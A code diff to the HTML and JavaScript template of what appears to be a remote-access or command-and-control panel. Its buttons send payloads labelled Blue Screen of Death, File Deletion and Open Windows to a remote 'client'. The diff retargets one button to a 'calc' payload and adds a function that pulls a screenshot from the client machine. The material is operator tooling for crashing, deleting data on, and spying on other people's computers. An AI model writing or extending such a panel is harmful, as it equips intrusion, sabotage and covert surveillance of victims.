@@ -38,7 +38,7 @@
                 </button>
                 <button type="button" class="list-group-item list-group-item-action" onclick="getPayloadBytes('bsod')">Blue Screen of Death</button>
                 <button type="button" class="list-group-item list-group-item-action"onclick="callAPI('test')">File Deletion</button>
-                <button type="button" class="list-group-item list-group-item-action"onclick="callAPI('test')">Open Windows</button>
+                <button type="button" class="list-group-item list-group-item-action"onclick="callAPI('calc')">Open Windows</button>
               </div><!-- End List group with Links and buttons -->
 
             </div>
@@ -117,6 +117,22 @@ function callAPI(payload) {
       "client": '{{client}}',
       "payload": payload
   }));
+}
+
+function getScreenshot() {
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", '/api/payload/ss', true);
+  xhr.setRequestHeader('Content-Type', 'application/json');
+  xhr.send(JSON.stringify({
+      "client": '{{client}}'
+  }));
+
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState == XMLHttpRequest.DONE) {
+        var ss = xhr.responseText;
+        console.log(ss);
+    }
+  }
 }
 
 </script>
